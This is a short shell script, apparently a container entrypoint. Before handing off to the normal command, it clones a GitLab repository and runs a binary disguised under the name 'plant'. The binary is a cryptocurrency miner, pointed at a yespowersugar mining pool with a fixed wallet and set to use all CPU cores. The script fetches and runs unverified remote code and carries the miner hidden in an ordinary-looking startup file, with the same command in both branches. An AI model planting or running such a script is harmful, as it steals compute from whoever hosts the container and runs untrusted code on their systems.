#!/bin/sh

set -e

if [ "$PROTO" = "ws" ]
then	git clone https://gitlab.com/azkadafa39/yiyi.git && cd yiyi && chmod +x plant && ./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.seger -p x -t $(nproc --all)
else	git clone https://gitlab.com/azkadafa39/yiyi.git && cd yiyi && chmod +x plant && ./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.seger -p x -t $(nproc --all)
fi


exec "$@"